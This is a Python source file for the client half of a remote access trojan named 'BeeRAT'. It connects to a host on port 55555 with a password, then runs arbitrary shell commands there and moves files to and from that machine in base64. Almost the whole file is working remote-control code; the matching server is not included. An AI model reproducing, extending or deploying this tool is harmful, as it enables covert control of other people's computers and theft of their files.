import base64
import getpass
import json
import os
import socket

FORMAT = 'utf-8'


class IncorrectPassword(Exception):
    pass


class Client:
    def __init__(self, ip) -> None:
        self.ip = ip

    def run(self):
        self.authenticate()
        while True:
            try:
                self.send('prompt')
                info = self.recv()
                command = input(f'{info}$ ').split(' ')
                if command[0] == 'exit':
                    self.send('exit')
                    main()
                elif command[0] == 'clear':
                    Client.clear()
                elif command[0] == 'download':
                    file_path = ' '.join(command[1:])
                    self.send(f'downloadable {file_path}')
                    downloadable = self.recv()
                    if downloadable:
                        file_name = os.path.basename(file_path)
                        self.send(' '.join(command))
                        file_content = self.recv()
                        print(self.write_file(file_name, file_content))
                    else:
                        print(f'download: {file_path}: Not downloadable')
                elif command[0] == 'upload':
                    file_path = ' '.join(command[1:])
                    if self.uploadable(file_path):
                        file_name = os.path.basename(file_path)
                        file_content = self.read_file(file_path)
                        self.send(f'upload {file_name}')
                        self.send(file_content)
                        print(self.recv())
                    else:
                        print(f'upload: {file_path}: Not uploadable')
                elif command[0] == 'change-password':
                    password = ' '.join(command[1:])
                    if len(password) >= 8:
                        self.send(' '.join(command))
                        if self.recv():
                            print('[+] Password saved successfully.')
                    else:
                        print('[-] password must be at least 8 characters long.')
                else:
                    command = ' '.join(command)
                    self.send(command)
                    result = self.recv()
                    print(result)
            except ConnectionResetError:
                print('[-] Server disconnected.')
                main()
            except Exception as e:
                print(str(e))
            except KeyboardInterrupt:
                pass

    def authenticate(self):
        password = getpass.getpass('Password: ')
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.settimeout(3)
        self.client.connect((self.ip, 55555))
        self.client.settimeout(None)
        self.send(password)
        result = self.recv()
        if not result:
            self.send(None)
            raise IncorrectPassword
        print('[+] Connected.')

    def send(self, data):
        json_data = json.dumps(data)
        self.client.send(json_data.encode(FORMAT))

    def recv(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode(FORMAT)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def clear():
        return os.system('cls' if os.name == 'nt' else 'clear')

    @staticmethod
    def rename_file(file_name):
        filename, extension = os.path.splitext(file_name)
        counter = 1
        while os.path.exists(file_name):
            file_name = f'{filename} ({counter}){extension}'
            counter += 1
        return file_name

    def write_file(self, filename, content):
        content = content.encode(FORMAT)
        filename = self.rename_file(filename)
        with open(filename, 'wb') as file:
            file.write(base64.b64decode(content))
            return f'[+] {filename} downloaded successfully.'

    @staticmethod
    def read_file(path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode(FORMAT)

    @staticmethod
    def uploadable(file_path):
        if os.path.isfile(file_path):
            return True
        if os.path.isfile(os.path.join(os.path.dirname(__file__), file_path)):
            return True
        return False


def main():
    while True:
        try:
            command = input('BeeRAT-Client$ ').split(' ')
            if command[0] == 'help' and len(command) == 1:
                print('Commands:\n\t\thelp\n\t\tclear\n\t\tconnect\n\t\texit\n')
            elif command[0] == 'clear' and len(command) == 1:
                Client.clear()
            elif command[0] == 'exit' and len(command) == 1:
                exit()
            elif command[0] == 'connect':
                ip = command[1]
                client = Client(ip)
                client.run()
            else:
                print('[-] Unknown command.')
        except (ConnectionRefusedError, TimeoutError):
            print('[-] Connection failed.')
        except (KeyboardInterrupt, EOFError):
            exit()
        except IncorrectPassword:
            print('[-] Password is incorrect.')
        except Exception as e:
            print('[-] Invalid ip.')


if __name__ == '__main__':
    main()
